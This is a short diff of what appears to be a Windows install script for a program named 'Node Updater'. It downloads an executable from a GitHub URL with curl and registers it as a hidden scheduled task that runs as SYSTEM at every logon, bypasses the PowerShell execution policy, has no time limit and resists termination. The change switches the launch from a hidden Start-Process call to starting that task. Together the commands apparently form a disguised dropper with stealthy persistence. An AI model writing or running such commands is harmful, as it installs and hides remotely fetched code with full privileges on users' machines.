@@ -15,4 +15,4 @@ curl -L -s -o "C:\Program Files\Node Updater\Node Updater.exe" https://github.co
 
 powershell.exe -ExecutionPolicy Bypass -NoLogo -Command "Register-ScheduledTask -TaskName 'Node Updater' -Action (New-ScheduledTaskAction -Execute 'C:\Program Files\Node Updater\Node Updater.exe') -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Settings (New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Seconds 0) -Hidden -DontStopOnIdleEnd -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DisallowHardTerminate -Priority 0 -Compatibility Win8) -User 'SYSTEM' -RunLevel Highest"
 
-powershell.exe -ExecutionPolicy Bypass -NoLogo -Command "Start-Process -FilePath 'C:\Program Files\Node Updater\Node Updater.exe' -WindowStyle Hidden"
+powershell.exe -ExecutionPolicy Bypass -NoLogo -Command "Start-ScheduledTask -TaskName 'Node Updater'"
